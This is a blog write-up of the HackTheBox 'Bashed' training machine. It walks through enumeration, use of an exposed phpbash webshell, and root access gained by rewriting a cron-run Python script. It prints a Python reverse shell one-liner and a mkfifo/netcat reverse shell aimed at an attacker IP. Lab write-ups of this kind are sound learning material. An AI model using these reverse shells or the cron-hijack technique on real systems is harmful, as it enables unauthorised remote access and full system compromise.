---
title: HackTheBox - Bashed
categories: writeups
layout: post
date: 2020-07-08 22:24 -0500
---
![Bashed](/assets/images/HTBoxes/Bashed/Bashed.png)

## Summary

This was a box that mainly involved scanning the web server for interesting items and then gaining foothold via a php webshell called phpbash.  Privilege escalation was a good exercise in not overcomplicating python code.

## Walkthrough

### Enumeration

Started with the usual nmap scan of ``nmap -T4 -A -v 10.10.10.68``.  Only thing found was a webserver so I looked at the webserver.

![phpbash webpage](/assets/images/HTBoxes/Bashed/Bashed-website.png)

I decided to run ``dirb`` as I have used ``gobuster`` before but not ``dirb`` so it ws a chance to get familiar with the tool. It seems to have its default wordlisting for directories and that worked here.

```bash
dirb http:///10.10.10.68

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Jul  7 22:41:29 2020
URL_BASE: http:///10.10.10.68/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http:///10.10.10.68/ ----
+ http:///10.10.10.68/css (CODE:301|SIZE:308)
+ http:///10.10.10.68/dev (CODE:301SIZE:308)
+ http:///10.10.10.68/fonts (CODE:301|SIZE:310)
+ http:///10.10.10.68/images (CODE:301|SIZE:311)
+ http:///10.10.10.68/index.html (CODE:200|SIZE:7743)
+ http:///10.10.10.68/js (CODE:301|SIZE:307)  
+ http:///10.10.10.68/php (CODE:301|SIZE:308)
+ http:///10.10.10.68/server-status (CODE:403|SIZE:299)
+ http:///10.10.10.68/uploads (CODE:301|SIZE:312)

-----------------
END_TIME: Tue Jul  7 22:45:06 2020
DOWNLOADED: 4612 - FOUND: 9
```

The noticable thing here that leads to something is ``/dev``.  Browsing to it shows us that ``phpbash`` is indeed available for use.  So browsing to ``http://10.10.10.68/dev/phpbash.php`` gave me a webshell.

![phpbash](/assets/images/HTBoxes/Bashed/phpbash-webshell.png)

### Foothold

I had issues trying to figure out how to use phpbash to get a reverse shell.  The usual ``nc`` command wasn't working, and the usual ``mkfifo`` one-liner workaround didn't work inside the webshell.  Also noticed perl and a few others weren't available as well.  For me only a python reverse shell one-liner worked:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

After getting a shell, I upgraded it with the standard python command:  
``python -c 'import pty; pty.spawn("/bin/bash")'``

Immediately after doing this I was getting an echo of each character
_lliikkee tthhiiss_

So I did a ``CTRL+Z`` to the background and ran ``stty raw -echo`` followed by ``fg`` to get my shell back, and the echo was gone.

### User

I immediately went to ``/home`` and noticed that arrexel's user folder had world readable permissions on the user.txt file. I was able to ``cat`` it easily as the www-data user.

### Root

Looking around the filesystem (and a peek at the official HTB walkthrough cause honestly, I have to be effective with my time at this point in my life) we see the ``/scripts`` root directory is owned by the _scriptmanager_ user.

Checking out ``sudo -l`` options we see that we can run anything as this _scriptmanager_ user so I grab a shell as the user via this command:
``sudo -u scriptmanager /bin/bash``

Moving into the interesting ``/scripts`` directory we see a couple files: ``test.py`` and ``test.txt``.

The ``test.txt`` file seems to update its timestamp every minute or so and is owned by _root_.  Looking at the contents of the ``test.py`` we can see why - it is simply putting text into the txt file when it executes.  _root_ must be executing it since it is the owner of the ``test.txt`` file.

Now that I had write access to the ``test.py`` file, I just needed to write some python code to give me a reverse shell.  I did some Googling and discovered this is as easy as just using native python os lib.

Since the native ``nc`` binary didn't support ``-e``.  I just went with the bash ``mkfifo`` one-liner that works when ``nc -e`` isn't available.

In ``test.py`` I added the code via an ``echo`` command:

```bash
echo "import os; os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4445 >/tmp/f')" > test.py
```

I had my `nc -lvnp 4445` listener up and it received a shell.  Got ``/root/root.txt`` without issue.

### Lessons Learned

Overall a pretty fun and straightforward box.  My first writeup as a means of keeping notes.  If it is helpful to others, that is great!  

In the future, I'm hoping to get better with screenshots etc. or learning how to capture the commands and output in gifs.  We will see.

As mentioned this was pretty straight forward.  I learned not to overcomplicate python code when you have an available escalation path via a root cronjob.
